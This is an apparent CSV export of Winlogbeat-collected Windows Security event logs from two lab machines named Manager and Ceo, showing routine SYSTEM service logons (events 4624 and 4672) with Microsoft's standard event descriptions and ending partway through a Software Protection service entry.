"Oct 23, 2022 @ 16:51:37.262",F3kKBIQByII7dpeEVws0,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:51:39.094","Oct 23, 2022 @ 16:51:37.389",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31176,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:51:37.262",GHkKBIQByII7dpeEVws0,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:51:39.094","Oct 23, 2022 @ 16:51:37.390",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31177,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:40:16.604","1Xj_A4QByII7dpeE9PZL",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:40:17.777","Oct 23, 2022 @ 16:40:16.714",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31174,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:40:16.604","1nj_A4QByII7dpeE9PZL",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:40:17.777","Oct 23, 2022 @ 16:40:16.715",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31175,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:40:16.540","03j_A4QByII7dpeE9PZL",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:40:17.772","Oct 23, 2022 @ 16:40:16.713",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31172,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:40:16.540","1Hj_A4QByII7dpeE9PZL",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:40:17.777","Oct 23, 2022 @ 16:40:16.714",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31173,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:32:47.951","73j5A4QByII7dpeEG-g5",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:32:49.206","Oct 23, 2022 @ 16:32:47.927",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"6,556","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31170,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:32:47.951","8Hj5A4QByII7dpeEG-g5",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:32:49.208","Oct 23, 2022 @ 16:32:47.928",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"6,556","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31171,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:31:23.871",WHj3A4QByII7dpeE0ub2,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:31:25.207","Oct 23, 2022 @ 16:31:23.892",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		CEO$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x26c
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",620,"-","SYSTEM, CEO$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"CEO$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"1,924","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28778,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:31:23.871",WXj3A4QByII7dpeE0ub2,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:31:25.215","Oct 23, 2022 @ 16:31:23.893",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{1f14668e-e63b-0000-1567-141f3be6d801}",wineventlog,Security,Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,924","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",28779,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:26:38.040",I3jzA4QByII7dpeEct0l,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:26:38.437","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T12:58:37Z. Reason: 